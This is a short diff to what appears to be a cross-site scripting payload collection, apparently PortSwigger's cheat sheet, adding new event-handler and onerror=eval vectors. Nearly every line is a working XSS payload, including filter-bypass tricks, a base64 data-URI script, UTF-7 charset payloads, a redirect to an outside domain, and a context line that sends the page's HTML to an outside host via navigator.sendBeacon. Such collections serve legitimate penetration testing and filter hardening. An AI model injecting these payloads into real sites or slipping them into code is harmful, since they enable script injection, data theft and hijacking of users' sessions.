@@ -1014,6 +1014,8 @@ code
 <* onsecuritypolicyviolation=alert(1)>XSS</*>
 <body onpageswap=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
 <button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>
+<input type=range ongotpointercapture=alert(1)>
+<input type=range onlostpointercapture=alert(1)>
 <xss class=progress-bar-animated onanimationstart=alert(1)>
 <xss class=\"carousel slide\" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=\"carousel-item active\"></xss><xss class=carousel-item></xss></xss></xss>
 <script src=data:text/javascript;base64,YWxlcnQoMSk=><\/script>
@@ -1103,6 +1105,8 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\\x281\\x29;var\\x20Uncaught//';z>
 <svg onload=onerror=eval;new'\"-alert\\x281\\x29//'>
 <script>onerror=eval,new name</script>
+<script>throw onerror=eval,x=new Error,x.message='alert\\x281\\x29',x</script>
+<script>throw onerror=eval,x=new Error,x.name='',x.message='=alert\\x281\\x29',x</script>
 <meta http-equiv=\"refresh\" content=\"0; url=\/\/portswigger-labs.net\">
 <meta charset=\"UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
 <meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
